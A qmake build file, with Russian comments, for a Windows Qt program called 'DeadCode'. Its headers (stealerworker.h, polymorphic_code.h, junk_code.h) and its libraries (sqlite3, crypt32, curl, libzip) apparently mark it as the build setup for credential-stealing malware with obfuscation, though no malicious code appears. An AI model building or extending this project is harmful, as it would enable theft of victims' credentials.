# Основные модули Qt
QT += core gui network widgets qml quick

TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (динамическая сборка Qt)
CONFIG += release

# Указываем спецификацию для MinGW
QMAKE_SPEC = win32-g++

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов (ручная обработка)
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    C:/vcpkg/installed/x64-mingw-dynamic/include \
    C:/Qt/5.15.2/mingw81_64/include

# Пути для поиска QML-модулей (используется Qt Creator для автодополнения)
# Для runtime нужно установить QML2_IMPORT_PATH в переменных окружения
QML_IMPORT_PATH += \
    C:/Qt/5.15.2/mingw81_64/qml

# Библиотеки для линковки
LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
        -lsqlite3 \
        -llibzip \
        -lzlib \
        -lbz2 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32 \
        -loleaut32 \
        -lmsvcrt

# Флаги компилятора
QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS \
                  -Wno-deprecated-declarations \
                  -Wno-cast-function-type \
                  -Wno-unused-parameter \
                  -Wno-sign-compare

# Флаги линковщика
QMAKE_LFLAGS += -O2 \
                -Wl,-subsystem,windows \
                -Wl,--allow-multiple-definition

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release
MOC_DIR = $$PWD/../build/release
UI_DIR = $$PWD/../build/release
RCC_DIR = $$PWD/../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = $$PWD/../build/debug
        OBJECTS_DIR = $$PWD/../build/debug
        MOC_DIR = $$PWD/../build/debug
        UI_DIR = $$PWD/../build/debug
        RCC_DIR = $$PWD/../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h \
            $$RCC_DIR/qrc_*.cpp
    }
}

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h